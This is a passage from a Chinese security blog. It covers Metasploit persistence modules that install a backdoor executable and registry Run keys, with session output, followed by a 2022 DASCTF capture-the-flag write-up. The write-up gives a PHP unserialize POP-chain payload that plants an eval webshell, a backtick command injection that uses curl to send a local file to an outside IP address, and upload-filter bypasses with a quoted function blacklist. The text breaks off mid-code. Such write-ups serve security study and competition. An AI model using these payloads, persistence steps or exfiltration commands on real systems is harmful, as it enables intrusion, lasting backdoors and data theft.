2019-06-12 06:46:21 -0700  metsvc-server.exe</span><br><span class="line">100777/rwxrwxrwx  61440   fil   2019-06-12 06:46:21 -0700  metsvc.exe</span><br></pre></td></tr></table></figure>

三个文件上传成功，但服务没有启动起来，失败了。使用<code>-r</code>参数可卸载服务。3.persistence_exe再来看看官方推荐的东西吧<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; info post/windows/manage/persistence_exe</span><br><span class="line"></span><br><span class="line">       Name: Windows Manage Persistent EXE Payload Installer</span><br><span class="line">     Module: post/windows/manage/persistence_exe</span><br><span class="line">   Platform: Windows</span><br><span class="line">       Arch: </span><br><span class="line">       Rank: Normal</span><br><span class="line"></span><br><span class="line">Provided by:</span><br><span class="line">  Merlyn drforbin Cousins &lt;drforbin6@gmail.com&gt;</span><br><span class="line"></span><br><span class="line">Compatible session types:</span><br><span class="line">  Meterpreter</span><br><span class="line"></span><br><span class="line">Basic options:</span><br><span class="line">  Name      Current Setting  Required  Description</span><br><span class="line">  ----      ---------------  --------  -----------</span><br><span class="line">  REXENAME  default.exe      yes       The name to call exe on remote system</span><br><span class="line">  REXEPATH                   yes       The remote executable to upload and execute.</span><br><span class="line">  SESSION                    yes       The session to run this module on.</span><br><span class="line">  STARTUP   USER             yes       Startup type for the persistent payload. (Accepted: USER, SYSTEM, SERVICE)</span><br><span class="line"></span><br><span class="line">Description:</span><br><span class="line">  This Module will upload an executable to a remote host and make it </span><br><span class="line">  Persistent. It can be installed as USER, SYSTEM, or SERVICE. USER </span><br><span class="line">  will start on user login, SYSTEM will start on system boot but </span><br><span class="line">  requires privs. SERVICE will create a new service which will start </span><br><span class="line">  the payload. Again requires privs.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Module options (post/windows/manage/persistence_exe):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   REXENAME  default.exe      yes       The name to call exe on remote system</span><br><span class="line">   REXEPATH                   yes       The remote executable to upload and execute.</span><br><span class="line">   SESSION                    yes       The session to run this module on.</span><br><span class="line">   STARTUP   USER             yes       Startup type for the persistent payload. (Accepted: USER, SYSTEM, SERVICE)</span><br></pre></td></tr></table></figure>

此模块将可执行文件上载到远程主机并进行创建持久性。<br>涉及到四个参数<ul>
<li>REXENAME是拷贝到目标系统中的名字</li>
<li>EXEPATH是将要上传的后门在本地的位置</li>
<li>SESSION是选择运行此模块的会话</li>
<li>STARTUP是启动类型，有USER、SYSTEM、SERVICE这三种取值，USER表示为将在用户登录时启动，SYSTEM表示将在系统启动时启动(需要权限)，SERVICE表示将创建一个启动服务项(需要权限)。</li>
</ul>
尝试一下：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/manage/persistence_exe REXENAME=backdoor.exe REXEPATH=/home/ubuntu/shell.exe STARTUP=USER</span><br><span class="line"></span><br><span class="line">[*] Running module against SAUCERMAN</span><br><span class="line">[*] Reading Payload from file /home/ubuntu/shell.exe</span><br><span class="line">[+] Persistent Script written to C:\Users\TideSec\AppData\Local\Temp\backdoor.exe</span><br><span class="line">[*] Executing script C:\Users\TideSec\AppData\Local\Temp\backdoor.exe</span><br><span class="line">[+] Agent executed with PID 3684</span><br><span class="line">[*] Installing into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\mEMZDQOxkkeebI</span><br><span class="line">[+] Installed into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\mEMZDQOxkkeebI</span><br><span class="line">[*] Cleanup Meterpreter RC File: /home/ubuntu/.msf4/logs/persistence/SAUCERMAN_20190612.1023/SAUCERMAN_20190612.1023.rc</span><br></pre></td></tr></table></figure>

4.registry_persistence完整路径为exploit/windows/local/registry_persistence和第一种方法类似，此模块将会安装一个payload到注册表的启动项中。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; background</span><br><span class="line">[*] Backgrounding session 13...</span><br><span class="line">msf5 auxiliary(server/socks5) &gt; use exploit/windows/local/registry_persistence</span><br><span class="line">msf5 exploit(windows/local/registry_persistence) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/local/registry_persistence):</span><br><span class="line"></span><br><span class="line">   Name           Current Setting  Required  Description</span><br><span class="line">   ----           ---------------  --------  -----------</span><br><span class="line">   BLOB_REG_KEY                    no        The registry key to use for storing the payload blob. (Default: random)</span><br><span class="line">   BLOB_REG_NAME                   no        The name to use for storing the payload blob. (Default: random)</span><br><span class="line">   CREATE_RC      true             no        Create a resource file for cleanup</span><br><span class="line">   RUN_NAME                        no        The name to use for the &#x27;Run&#x27; key. (Default: random)</span><br><span class="line">   SESSION                         yes       The session to run this module on.</span><br><span class="line">   SLEEP_TIME     0                no        Amount of time to sleep (in seconds) before executing payload. (Default: 0)</span><br><span class="line">   STARTUP        USER             yes       Startup type for the persistent payload. (Accepted: USER, SYSTEM)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(windows/local/registry_persistence) &gt; set SESSION 13</span><br><span class="line">SESSION =&gt; 13</span><br><span class="line">msf5 exploit(windows/local/registry_persistence) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Generating payload blob..</span><br><span class="line">[+] Generated payload, 6048 bytes</span><br><span class="line">[*] Root path is HKCU</span><br><span class="line">[*] Installing payload blob..</span><br><span class="line">[+] Created registry key HKCU\Software\0BaG3zDR</span><br><span class="line">[+] Installed payload blob to HKCU\Software\0BaG3zDR\iiEB4InD</span><br><span class="line">[*] Installing run key</span><br><span class="line">[+] Installed run key HKCU\Software\Microsoft\Windows\CurrentVersion\Run\SMPqA5kB</span><br><span class="line">[*] Clean up Meterpreter RC file: /home/ubuntu/.msf4/logs/persistence/192.168.81.154_20190612.2138/192.168.81.154_20190612.2138.rc</span><br></pre></td></tr></table></figure>

同类型的还有其他payload，如exploit/windows/local/vss_persistence，exploit/windows/local/s4u_persistence。<h2 id="参考-5"><a href="#参考-5" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2536">https://xz.aliyun.com/t/2536</a></li>
<li><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/164525">https://www.anquanke.com/post/id/164525</a></li>
<li><a target="_blank" rel="noopener" href="https://www.freebuf.com/sectool/118714.html">访问的文章审核中… - FreeBuf网络安全行业门户</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2022/04/01/2022DASCTF%20X%20SU%20%E4%B8%89%E6%9C%88%E6%98%A5%E5%AD%A3%E6%8C%91%E6%88%98%E8%B5%9B/">2022DASCTF X SU 三月春季挑战赛</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2022-04-01</time><div class="content"><h2 id="ezpop"><a href="#ezpop" class="headerlink" title="ezpop"></a>ezpop</h2><p>题目</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">crow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">eval</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">new</span> <span class="keyword">$this</span>-&gt;v1(<span class="keyword">$this</span>-&gt;v2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;v1-&gt;world();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fin</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$f1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;f1 . <span class="string">&#x27;114514&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="keyword">$this</span>-&gt;f1)();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;f1-&gt;get_flag();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">what</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a-&gt;run();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mix</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$m1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="keyword">$this</span>-&gt;m1)();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&#x27;#&#x27;</span> . <span class="keyword">$this</span>-&gt;m1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">    unserialize(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>拿到题目后分析<br>我们应先从fin中进入，则<br>__destruct-&gt;_toString-&gt;run()-&gt;__invoke-&gt;__call-&gt;get_flag()<br>则poc为</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">crow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fin</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$f1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">what</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mix</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$m1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> fin();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> what();</span><br><span class="line"><span class="variable">$a2</span> = <span class="keyword">new</span> fin();</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> crow();</span><br><span class="line"><span class="variable">$a3</span> = <span class="keyword">new</span> fin();</span><br><span class="line"><span class="variable">$d</span> = <span class="keyword">new</span> mix();</span><br><span class="line"><span class="variable">$d</span>-&gt;m1 = <span class="string">&#x27;?&gt;&lt;?=eval($_POST[1]);&#x27;</span>;</span><br><span class="line"><span class="variable">$a3</span>-&gt;f1 = <span class="variable">$d</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;v1 = <span class="variable">$a3</span>;</span><br><span class="line"><span class="variable">$a2</span>-&gt;f1 = <span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;a = <span class="variable">$a2</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;f1 = <span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>
<p>payload</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=O:<span class="number">3</span>:<span class="string">&quot;fin&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;f1&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;what&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;O:<span class="number">3</span>:<span class="string">&quot;fin&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;f1&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;crow&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;v1&quot;</span>;O:<span class="number">3</span>:<span class="string">&quot;fin&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;f1&quot;</span>;O:<span class="number">3</span>:<span class="string">&quot;mix&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;m1&quot;</span>;s:<span class="number">26</span>:<span class="string">&quot;?&gt;&lt;?php eval(<span class="subst">$_POST</span>[1]);?&gt;&quot;</span>;&#125;&#125;s:<span class="number">2</span>:<span class="string">&quot;v2&quot;</span>;N;&#125;&#125;&#125;&#125;&amp;<span class="number">1</span>=phpinfo();</span><br></pre></td></tr></table></figure>

<h2 id="calc"><a href="#calc" class="headerlink" title="calc"></a>calc</h2><p>拿到本题，进入看到源码<br><img src="https://img-blog.csdnimg.cn/8b9bf4ad64fb41af87a7c8ed319e537a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16"><br>看到waf绕过了许多函数<br>在写的时候有许多不懂得，同时也想多了<br>这题给出了源代码，看到WAF过滤了小括号，感觉没办法执行函数，从而放弃eval()函数为切入点，转而看起os.system()函数。WAF中并没有过滤反引号，已知Linux中反引号是可以执行命令的，这里就可以直接利用了</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`ls`</span><br></pre></td></tr></table></figure>
<p>但是这样在eval中就会报错，导致不会执行os.system，后来想到利用Python中的注释符把反引号的内容注释了，最后Payload</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>+<span class="number">1</span><span class="comment">#`ls`</span></span><br></pre></td></tr></table></figure>
<p>注意空格替换为%09<br>(学到了curl带外【美滋滋】)</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?num=<span class="number">1</span>%<span class="number">2</span>B1%<span class="number">23</span>%<span class="number">60</span>ls%<span class="number">60</span></span><br><span class="line">?num=<span class="number">1</span>%<span class="number">2</span>B1%<span class="number">23</span>%<span class="number">60</span>curl%<span class="number">09</span>http:<span class="comment">//124.222.115.141:9000%09-F%09xx=@./tmp/log.txt%60</span></span><br><span class="line">?num=<span class="number">1</span>%<span class="number">2</span>B1%<span class="number">23</span>%<span class="number">60</span>cat%<span class="number">09</span>Th*%<span class="number">60</span></span><br><span class="line">?num=<span class="number">1</span>%<span class="number">2</span>B1%<span class="number">23</span>%<span class="number">60</span>curl%<span class="number">09</span>http:<span class="comment">//124.222.115.141:9000%09-F%09xx=@./tmp/log.txt%60</span></span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/21ec8504e29c4a578e25d9167043a25f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
<h2 id="upgdstore"><a href="#upgdstore" class="headerlink" title="upgdstore"></a>upgdstore</h2><p>直接上传</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> phpinfo();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>得到<br><img src="https://img-blog.csdnimg.cn/3cb8cf8bd2234388a6ada60a7fddeac1.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16"><br>经查找发现putenv,mail没有被ban<br>现在就是尝试能不能getshell，show_source没有被ban，上传的时候一直被检测<br><img src="https://img-blog.csdnimg.cn/7dd3fbee46674898a5e035dd785a17a1.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16"><br>尝试大小写绕过发现可行(或使用其他绕过方式）</p>
<blockquote>
<p>动态绕过 <?php base64_decode('c2hvd19zb3VyY2U=')('../index.php');?><br>&lt;?php echo (‘fil’.’e_get_contents’)(‘/var/www/html/index.php’);<br>在PHP中，函数名、方法名、类名、关键字不区分大小写；但变量名、常量名区分大小写。</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/a5b4f75a4c054c0d8aa667a02b5055c6.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16"><br>之后进行文件读取<br><img src="https://img-blog.csdnimg.cn/483380e6a9a744f5a0790f5436bb6cdb.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fun</span>(<span class="params"><span class="variable">$var</span></span>): <span class="title">bool</span></span>&#123;</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&quot;\$_&quot;</span>, <span class="string">&quot;eval&quot;</span>,<span class="string">&quot;copy&quot;</span> ,<span class="string">&quot;assert&quot;</span>,<span class="string">&quot;usort&quot;</span>,<span class="string">&quot;include&quot;</span>, <span class="string">&quot;require&quot;</span>, <span class="string">&quot;$&quot;</span>, <span class="string">&quot;^&quot;</span>, <span class="string">&quot;~&quot;</span>, <span class="string">&quot;-&quot;</span>, <span class="string">&quot;%&quot;</span>, <span class="string">&quot;*&quot;</span>,<span class="string">&quot;file&quot;</span>,<span class="string">&quot;fopen&quot;</span>,<span class="string">&quot;fwriter&quot;</span>,<span class="string">&quot;fput&quot;</span>,<span class="string">&quot;copy&quot;</span>,<span class="string">&quot;curl&quot;</span>,<span class="string">&quot;fread&quot;</span>,<span class="string">&quot;fget&quot;</span>,<span class="string">&quot;function_exists&quot;</span>,<span class="string">&quot;dl&quot;</span>,<span class="string">&quot;putenv&quot;</span>,<span class="string">&quot;system&quot;</span>,<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;shell_exec&quot;</span>,<span class="string">&quot;passthru&quot;</span>,<span class="string">&quot;proc_open&quot;</span>,<span class="string">&quot;proc_close&quot;</span>, <span class="string">&quot;proc_get_status&quot;</span>,<span class="string">&quot;checkdnsrr&quot;</span>,<span class="string">&quot;getmxrr&quot;</span>,<span class="string">&quot;getservbyname&quot;</span>,<span class="string">&quot;getservbyport&quot;</span>, <span class="string">&quot;syslog&quot;</span>,<span class="string">&quot;popen&quot;</span>,<span class="string">&quot;show_source&quot;</span>,<span class="string">&quot;highlight_file&quot;</span>,<span class="string">&quot;`&quot;</span>,<span class="string">&quot;chmod&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackword</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(strstr(<span class="variable">$var</span>, <span class="variable">$blackword</span>)) <span class="keyword">return</span> <span class="literal">True</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span>;</span><br><span class="line">&#125;</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//设置上传目录</span></span><br><span class="line">define(<span class="string">&quot;UPLOAD_PATH&quot;</span>, <span class="string">&quot;./uploads&quot;</span>);</span><br><span class="line"><span class="variable">$msg</span> = <span class="string">&quot;Upload Success!&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line"><span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"><span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="variable">$ext</span> = pathinfo(<span class="variable">$file_name</span>,PATHINFO_EXTENSION);<span class="comment">//返回文件后缀</span></span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&quot;/php/i&quot;</span>, strtolower(<span class="variable">$ext</span>)))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;只要好看的php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$content</span> = file_get_contents(<span class="variable">$temp_file</span>);</span><br><span class="line"><span class="keyword">if</span>(fun(<span class="variable">$content</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;诶，被我发现了吧&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$new_file_name</span> = md5(<span class="variable">$file_name</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$ext</span>;</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$new_file_name</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;Upload 